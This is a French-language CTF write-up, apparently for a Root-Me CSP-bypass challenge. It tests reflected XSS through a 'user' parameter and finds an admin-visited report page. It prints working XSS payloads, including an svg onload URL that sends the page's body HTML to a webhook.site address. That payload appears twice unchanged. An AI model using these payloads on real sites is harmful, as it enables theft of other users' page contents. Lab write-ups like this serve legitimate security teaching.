
![](../img/Pasted%20image%2020260814235635.png)


Dans ce challenge nous pouvons voir qu'il faudra exfiltrez le contenu d'une page. 

Nous allons tout d'abord voir ce qu'il y a sur le site et comment il se présente.


Page principale : 

![](../img/Pasted%20image%2020260815001110.png)

Voyons voir ce qu'il se passe lorsqu'on rentre dans le input une valeur de teste par exemple "test".

![](../img/Pasted%20image%2020260815001158.png)

Nous pouvons voir actuellement que dans l'URL du site il y a un paramètre de requête nommer user qui à pour valeur l'input qu'on viens de mettre. 

Image explicatif : 

![](../img/Pasted%20image%2020260815001358.png)


Dans ce cas ci nous allons voir si nous pouvons Bypass les CSP restrictions. Car oui même si pour l'instant nous avons pas fais de test (je vais vous montrer comme quoi il y a bien la restriction) au nom du challenge nous pouvons déjà savoir que le challenge va se basé sur le contournement de sécurité du CSP (Content Security Policy). 

Bon maintenant tentons une XSS basique comme par exemple : 

```html
<script>alert("test")</script>
```

![](../img/Pasted%20image%2020260815001654.png)

Nous pouvons voir dans l'url en paramètre que j'ai tenter l'XSS basique qui est celui que je vous ai montrer juste au dessus.

Maintenant comment bypass ? 

En réalité une XSS ne se base pas que sur la balise script. Il y d'autre XSS qui sont possible, comme par exemple avec les balises svg et img qui vont nous permettre d'exécuté du code javascript dans le navigateur directement. Grâce à des attributs de gestionnaire d'événements, pourquoi ce nom ? Car nous allons gérer l'action qui se passe lorsque l'événement est utilisé. C'est assez brouillon dis comme cela mais laisser moi vous montrez : 

```html
<svg onload="alert('test')">
```

Ici nous avons un autre payload pour voir s'il y a bel est bien une XSS qui sont possible.
Ici ce payload permet de faire charger une image SVG(Scalable Vector Graphics) c'est un type d'image qui est générer grâce à un code XML. Bon cette image à un attributs d'événement qui s'appelle onload. Onload veut dire que lorsque l'image sera charger alors on fais une action. C'est pour cela le ="". Attention lorsque vous allez mettre du code dans le ="" vous ne pouvez plus utiliser le caractère "" pour votre payload. Car javascript n'aime pas et va fermer le payload avant que vous le vouliez. 

Bon maintenant vous avez deveniez on exécute alert("test") qui va nous afficher un message à l'écran(si le XSS passe).

Passons au test du payload : 

![](../img/Pasted%20image%2020260815002652.png)

Bingo nous pouvons voir que notre payload à bel est bien étais interprêter côté Serveur. Bon maintenant que nous savons qu'il y a une XSS nous pouvons passer à la suite. Car oui nous avons beau avoir trouver une faille XSS elle se passe que sur notre client. Or nous n'avons pas le contenu de la page avec le Flag il va falloir qu'on trouve un moyen que le bot ou qu'un administrateur / compte admin exécute notre payload ou au moins charge la page. 

Attendez mais on est pas aller voir le bouton "Fill in forum"

![](../img/Pasted%20image%2020260815002907.png)

Voyons voir la page qui nous redirige. 

![](../img/Pasted%20image%2020260815002953.png)

Okay nous avons une page pour signaler une page qui est vulnérable à une faille de sécurité. Ce qui veut dire qu'un admin va passer par notre lien malveillant. Bingo ! Maintenant nous allons complexifier notre payload.


![](../img/Pasted%20image%2020260815000649.png)


Première tentative de payload : 
```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
```



Nouveau Payload

```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
```

